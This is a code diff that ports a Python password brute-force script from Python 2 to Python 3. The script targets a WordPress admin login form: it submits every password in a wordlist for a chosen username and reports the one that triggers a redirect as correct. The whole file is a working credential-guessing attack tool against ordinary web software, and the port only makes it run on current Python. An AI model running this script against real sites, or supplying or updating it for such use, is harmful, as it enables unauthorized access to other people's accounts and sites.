@@ -1,10 +1,10 @@
 #/bin/python
 # Default is set up for a wordpress admin form
-import mechanize 
+import mechanize
 import logging
 import time
 from optparse import OptionParser
-from urllib2 import HTTPError
+from urllib.error import HTTPError
 
 form_username = 'log'
 form_password = 'pwd'
@@ -20,21 +20,21 @@ def brute_server(server, user, password_list):
   br.open(server)
   pass_list = open(password_list)
   for x in pass_list.readlines():
-    try:  
+    try:
       time.sleep(3)
       br.select_form( nr = 0 )
       br.form[form_username] = user
       br.form[form_password] = ''.join(x)
-      print "Checking ",''.join(x)
+      print("Checking ",''.join(x))
       request = br.click(name=form_submit)
       response = br.open(request)
       if response.code == 200:
-        print "No dice..."
-    except HTTPError, e:
+        print("No dice...")
+    except HTTPError as e:
       if e.code == 302: # Redirect is our success case
-	    print "Correct password is ",''.join(x)
+        print("Correct password is ",''.join(x))
 
-		
+
 def main():
 
   # Setup the command line arguments.
@@ -54,26 +54,26 @@ def main():
   # Option for target web form to brute
   optp.add_option("-t", "--target", dest="target",
                   help="The target form to brute")
-				  
+
   # Option for username to attack
   optp.add_option("-u", "--user", dest="user",
                   help="The username field of the form")
-				  
+
   # Option for target web form to brute
   optp.add_option("-p", "--password", dest="password",
                   help="The password list to use in the dictionary attack")
-				  
+
   opts, args = optp.parse_args()
 
   if opts.target is None:
-    opts.target = raw_input("What is the target page with the form: ")
-	
+    opts.target = input("What is the target page with the form: ")
+
   if opts.user is None:
-    opts.user = raw_input("What is the username to brute force: ")
-	
+    opts.user = input("What is the username to brute force: ")
+
   if opts.password is None:
-    opts.password = raw_input("What is the password list file to use: ")
-  
+    opts.password = input("What is the password list file to use: ")
+
   # Setup logging.
   logging.basicConfig(level=opts.loglevel,
                       format='%(levelname)-8s %(message)s')
@@ -82,12 +82,12 @@ def main():
   # Main Event Loop:
   try:
     brute_server(opts.target, opts.user, opts.password)
-  
+
   except (KeyboardInterrupt, EOFError) as e:
-    print "Exiting..."
+    print("Exiting...")
     exit(0)
-	
-  print "Completed Password List!"
-  
+
+  print("Completed Password List!")
+
 if __name__ == '__main__':
   main()
